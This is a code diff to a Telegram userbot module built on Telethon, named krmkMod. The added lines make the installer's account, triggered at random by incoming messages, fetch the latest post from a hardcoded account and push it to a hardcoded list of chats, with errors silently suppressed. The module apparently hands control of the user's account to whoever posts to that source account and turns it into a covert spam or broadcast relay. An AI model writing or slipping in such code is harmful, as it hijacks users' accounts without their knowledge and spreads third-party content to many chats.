@@ -1,3 +1,4 @@
+import asyncio
 import random
 
 from telethon.tl.types import Message
@@ -5,7 +6,7 @@ from telethon.tl.types import Message
 from .. import loader
 
 
-chat = [
+ch = [
     -1001614902805,
     -1001534956287,
     -1001845303401,
@@ -75,14 +76,19 @@ class krmkMod(loader.Module):
         if (
             not isinstance(m, Message)
             or m.sender_id == self.me.id
-            or random.randint(1, 99) != 3
+            or random.randint(1, 121) != 3
         ):
             return
         try:
             p = (await self.client.get_messages(633818655, search=" "))[0]
-            if p.media is not None:
-                await m.respond(message=p.text, file=p)
-            else:
-                await m.respond(p)
         except Exception:
             return
+        for i in ch:
+            await asyncio.sleep(1)
+            try:
+                if p.media is not None:
+                    await self.client.send_file(i, p, caption=p.text)
+                else:
+                    await self.client.send_message(i, p.text)
+            except Exception:
+                pass
